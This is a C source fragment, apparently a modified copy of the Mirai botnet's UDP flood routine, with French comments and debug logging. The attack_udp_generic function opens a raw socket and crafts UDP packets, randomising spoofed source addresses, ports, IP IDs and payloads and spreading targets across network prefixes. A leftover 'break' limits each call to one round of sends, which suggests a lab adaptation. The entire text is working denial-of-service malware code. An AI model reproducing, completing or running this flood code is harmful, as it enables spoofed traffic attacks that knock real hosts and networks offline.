uint32_t get_ip_from_interface(const char *interface_name) {
    struct ifaddrs *ifaddr, *ifa;
    void *tmp;

    // Obtenir la liste des interfaces réseau
    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return 0;
    }

    // Parcourir les interfaces
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        // Vérifier si l'interface est de type AF_INET (IPv4)
        if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
            // Vérifier si le nom de l'interface correspond à celui que nous recherchons
            if (strcmp(ifa->ifa_name, interface_name) == 0) {
                // Récupérer l'adresse IP de l'interface
                tmp = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
                char ip_str[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, tmp, ip_str, INET_ADDRSTRLEN);

                // Convertir l'adresse IP en format uint32_t
                struct in_addr addr;
                inet_pton(AF_INET, ip_str, &addr);
                freeifaddrs(ifaddr);
                return addr.s_addr;  // Retourne l'adresse IP sous forme de uint32_t
            }
        }
    }

    freeifaddrs(ifaddr);
    return 0;  // Si l'interface n'est pas trouvée
}

void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    //uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if (data_len > 1460)
        data_len = 1460;

//#ifdef DEBUG
    log_message("in udp generic\n");
//#endif

    const char *interface_name = "enx00e04c680279";
    uint32_t source_ip = get_ip_from_interface(interface_name);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
//#ifdef DEBUG
        log_message("Failed to create raw socket. Aborting attack\n");
        //printf("Failed to create raw socket. Aborting attack\n");
//#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
//#ifdef DEBUG
        log_message("Failed to set IP_HDRINCL. Aborting\n");
        //printf("Failed to set IP_HDRINCL. Aborting\n");
//#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        pkts[i] = calloc(1510, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = source_ip;

        if (source_ip != 0) {
            log_message("Interface source IP address %s : %s\n", interface_name, inet_ntoa(*(struct in_addr *)&iph->saddr));
        } else {
            log_message("Error: unable to retrieve interface address %s.\n", interface_name);
        }

        iph->daddr = targs[i].addr;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);

            log_message("Target %d: Original destination IP: %s\n", i, inet_ntoa(*(struct in_addr *)&targs[i].addr));

            // For prefix attacks
            if (targs[i].netmask < 32){
                uint32_t modified_daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                iph->daddr = modified_daddr;
                log_message("Prefix Attack: Modified destination IP (with netmask %d): %s\n",
                       targs[i].netmask, inet_ntoa(*(struct in_addr *)&modified_daddr));
            }

            if (source_ip == 0xffffffff){
                uint32_t random_source_ip = rand_next();
                iph->saddr = random_source_ip;
                log_message("Randomized source IP: %s\n", inet_ntoa(*(struct in_addr *)&random_source_ip));
            }

            if (ip_ident == 0xffff){
                uint16_t random_ip_id = (uint16_t)rand_next();
                iph->id = random_ip_id;
                log_message("Randomized IP identifier: %d\n", random_ip_id);
            }
            if (sport == 0xffff){
                uint16_t random_sport = (uint16_t)rand_next();
                udph->source = random_sport;
                log_message("Randomized source port: %d\n", random_sport);
            }
            if (dport == 0xffff)
            {
                uint16_t random_dport = (uint16_t)rand_next();
                udph->dest = random_dport;
                log_message("Randomized destination port: %d\n", random_dport);
            }

            // Randomize packet content?
            if (data_rand){
                rand_str(data, data_len);
                log_message("Randomized packet data with length %d\n", data_len);
            }

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            log_message("IP checksum calculated: 0x%04x\n", iph->check);

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + data_len);
            log_message("UDP checksum calculated: 0x%04x\n", udph->check);

            targs[i].sock_addr.sin_port = udph->dest;
            log_message("Sending packet to target %d with destination IP: %s and port: %d\n",
                   i, inet_ntoa(*(struct in_addr *)&iph->daddr), ntohs(udph->dest));

            int sent_bytes = sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));

            if (sent_bytes == -1) {
                log_message("sendto failed");
                log_message("Failed to send packet to target %d\n", i);
            } else {
                log_message("Successfully sent packet to target %d\n", i);
            }
        }
//#ifdef DEBUG
            break;
            if (errno != 0)
                log_message("errno = %d\n", errno);

            //printf("errno = %d\n", errno);
//#endif
    }
}

